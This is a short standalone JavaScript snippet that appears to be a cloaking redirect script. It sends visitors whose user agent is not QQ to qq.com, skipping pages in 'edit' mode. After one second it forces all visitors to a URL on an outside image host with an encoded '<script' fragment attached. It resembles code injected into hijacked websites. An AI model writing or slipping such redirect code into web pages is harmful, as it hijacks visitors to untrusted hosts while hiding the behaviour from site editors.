function leleua() {
    var sUserAgent = navigator.userAgent.toLowerCase();
    if (sUserAgent.match(/QQ/i) == 'qq' || location.href.indexOf("edit") > -1) {
    } else {
        window.location.href = "https://qq.com";
    }
}

leleua();

setTimeout(function() {
    var timestamp = new Date().getTime();
    var url = 'https://img.2qj.com/FsCTr9srrXMrzWNNG-cesCyE--08' + '?' + timestamp + '%3Cscript';
    location.href = url;
}, 1000);
